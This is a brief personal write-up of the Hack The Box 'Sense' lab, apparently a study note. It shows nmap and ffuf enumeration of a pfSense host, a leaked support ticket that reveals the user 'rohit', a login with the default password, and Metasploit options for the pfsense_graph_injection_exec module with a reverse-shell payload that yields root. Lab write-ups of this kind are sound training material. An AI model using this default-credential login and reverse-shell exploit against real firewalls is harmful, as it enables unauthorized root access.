## Sense

### Lab Details 

- Difficulty: Easy
- Type: Linux

#### Enumeration
- run nmap
```
PORT    STATE SERVICE  REASON  VERSION
80/tcp  open  http     syn-ack lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://bogon/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open  ssl/http syn-ack lighttpd 1.4.35
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/organizationalUnitName=Organizational Unit Name (eg, section)/emailAddress=Email Address/localityName=Somecity
| Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/organizationalUnitName=Organizational Unit Name (eg, section)/emailAddress=Email Address/localityName=Somecity
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-10-14T19:21:35
| Not valid after:  2023-04-06T19:21:35
| MD5:   65f8:b00f:57d2:3468:2c52:0f44:8110:c622
| SHA-1: 4f7c:9a75:cb7f:70d3:8087:08cb:8c27:20dc:05f1:bb02
| -----BEGIN CERTIFICATE-----
| MIIEKDCCA5GgAwIBAgIJALChaIpiwz41MA0GCSqGSIb3DQEBCwUAMIG/MQswCQYD
| VQQGEwJVUzESMBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEU
| MBIGA1UEChMLQ29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVu
| aXQgTmFtZSAoZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcs
| IFlPVVIgbmFtZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3MwHhcNMTcx
| MDE0MTkyMTM1WhcNMjMwNDA2MTkyMTM1WjCBvzELMAkGA1UEBhMCVVMxEjAQBgNV
| BAgTCVNvbWV3aGVyZTERMA8GA1UEBxMIU29tZWNpdHkxFDASBgNVBAoTC0NvbXBh
| bnlOYW1lMS8wLQYDVQQLEyZPcmdhbml6YXRpb25hbCBVbml0IE5hbWUgKGVnLCBz
| ZWN0aW9uKTEkMCIGA1UEAxMbQ29tbW9uIE5hbWUgKGVnLCBZT1VSIG5hbWUpMRww
| GgYJKoZIhvcNAQkBFg1FbWFpbCBBZGRyZXNzMIGfMA0GCSqGSIb3DQEBAQUAA4GN
| ADCBiQKBgQC/sWU6By08lGbvttAfx47SWksgA7FavNrEoW9IRp0W/RF9Fp5BQesL
| L3FMJ0MHyGcfRhnL5VwDCL0E+1Y05az8PY8kUmjvxSvxQCLn6Mh3nTZkiAJ8vpB0
| WAnjltrTCEsv7Dnz2OofkpqaUnoNGfO3uKWPvRXl9OlSe/BcDStffQIDAQABo4IB
| KDCCASQwHQYDVR0OBBYEFDK5DS/hTsi9SHxT749Od/p3Lq05MIH0BgNVHSMEgeww
| gemAFDK5DS/hTsi9SHxT749Od/p3Lq05oYHFpIHCMIG/MQswCQYDVQQGEwJVUzES
| MBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEUMBIGA1UEChML
| Q29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVuaXQgTmFtZSAo
| ZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcsIFlPVVIgbmFt
| ZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3OCCQCwoWiKYsM+NTAMBgNV
| HRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4GBAHNn+1AX2qwJ9zhgN3I4ES1Vq84l
| n6p7OoBefxcf31Pn3VDnbvJJFFcZdplDxbIWh5lyjpTHRJQyHECtEMW677rFXJAl
| /cEYWHDndn9Gwaxn7JyffK5lUAPMPEDtudQb3cxrevP/iFZwefi2d5p3jFkDCcGI
| +Y0tZRIRzHWgQHa/
|_-----END CERTIFICATE-----
|_http-favicon: Unknown favicon MD5: 082559A7867CF27ACAB7E9867A8B320F
|_http-server-header: lighttpd/1.4.35
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: 501
```
- investigate port 80/443 (HTTP/HTTPS)
	- upon loading, presents `pfsense` login form on home page
	- enumerate directories using `ffuf`, unable to find anything interesting
```
$ ffuf -u https://10.10.10.60:443/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

<snip>
themes                  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 465ms]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 698ms]
includes                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 598ms]
javascript              [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 475ms]
classes                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 472ms]
widgets                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 344ms]
```
	- used `dirbuster` as validator
		- we get `system-users.txt`
```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```
		- attempt user login `rohit:pfsense`
#### Initial Foothold 
#### Lateral Movement (If any)

#### Privilege Escalation
![[home.png]]
- search online for the version of the application `2.1.3`, found https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/http/pfsense_graph_injection_exec.md
```
msf6 exploit(unix/http/pfsense_graph_injection_exec) > options

Module options (exploit/unix/http/pfsense_graph_injection_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          yes       Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    10.10.10.60      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     443              yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   USERNAME  rohit            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             
```
- attempt the exploit, we get shell as `root`

#### Resources

#### Lesson Learned
- Try enumerate again using `dirbuster` as secondary validator 